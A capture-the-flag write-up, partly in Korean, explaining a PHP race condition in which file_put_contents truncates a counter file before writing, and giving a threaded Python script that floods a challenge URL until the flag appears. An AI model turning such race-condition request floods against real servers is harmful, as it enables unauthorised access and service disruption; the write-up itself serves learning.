# Count (Web)

-----
This challenge is simple race condition in php  
php has functions called `file_get_contents` and `file_put_contents`

`file_put_contents` function is accepts four args. (can $flags, $context args be omitted)  
```c
int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )
``` 
This function is identical to calling fopen(), fwrite() and fclose() successively to write data to a file.  
  
영어로 쓰다가 힘들어서 그냥 한국어로 쓴다.  
  
`file_put_contents`에서 `flags` 인자에 따로 값을 주지 않으면 기본 값은 `0`이다.  
[php 소스](https://github.com/php/php-src "php 소스")에서 `ext/standard/file.c`를 열어서 들여다보면 `flags`가 0일때 모드는 `wb` 모드이다.  
즉, 기존에 abc라는 파일이 있고 `file_put_contents`로 `file_put_contents('abc', 'asdf');` 이렇게 쓴다면  
기존 abc에 있던 내용은 다 지워지고 `asdf`라는 내용이 들어간다.  
  
이 문제는 이러한 특징을 이용한 레이스 컨디션 문제다.  

```php
$cnt = (int)file_get_contents('cnt-file');

if($cnt == 30) {
    $cnt = 10;
}

$cnt = $cnt + 1;
file_put_contents('cnt-file', $cnt);

if($cnt == 1) {
    die($flag);
}
```
위 소스는 문제 소스중 일부분이다.  
`$cnt`의 초기값은 5다. (cnt-file에 있는 값이 5)  

새로고침할 때마다 `$cnt`가 1씩 증가하고 증가한 값을 cnt-file에 쓴다.  
그리고 증가하다가 30이 되면 10으로 초기화한다.  

위에서 설명한 `file_put_contents`의 특징을 모르는 상태라면 말도 안되는 코드라고 생각할 수 있다.  
하지만 이제 `file_put_contents`의 특징을 알기 때문에 `file_put_contents`로 값을 쓸 때 잠깐동안 지워지는 그 순간을 노리면 된다.  

exploit.py  

```python
import requests
import threading
# made by munsiwoo

def request(sandbox) :
	global response
	uri = 'http://game.withphp.com/ouya/sandbox/' + sandbox
	response = requests.get(uri).text

if __name__ == '__main__' :
	sandbox = '80e30ab2318c6a531cdde54c009a54ca/'
	response = ''

	while True :
		threading.Thread(target=request, args=(sandbox,)).start()
		if(response.find('Sunrin{') != -1) : # flag format is Sunrin{...}
			print(response)
			break

	print('End')

```
